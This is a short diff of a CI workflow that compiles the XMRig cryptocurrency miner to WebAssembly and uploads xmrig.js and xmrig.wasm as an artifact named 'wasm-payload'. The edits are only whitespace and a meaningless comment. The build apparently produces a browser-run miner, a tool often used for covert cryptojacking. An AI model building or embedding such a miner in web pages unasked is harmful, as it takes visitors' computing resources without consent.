@@ -11,9 +11,9 @@ jobs:
           submodules: recursive  # <--- MUST BE HERE to pull the code
 
       - name: Install Build Dependencies
-        run: |
+        run: |                       #ri niouhn
           sudo apt-get update
-          sudo apt-get install -y cmake build-essential libuv1-dev libssl-dev
+          sudo apt-get install -y cmake build-essential libuv1-dev libssl-dev 
 
       - name: Setup Emscripten
         uses: mymindstorm/setup-emsdk@v14
@@ -41,4 +41,4 @@ jobs:
           name: wasm-payload
           path: |
             build/xmrig.js
-            build/xmrig.wasm
+            build/xmrig.wasm  
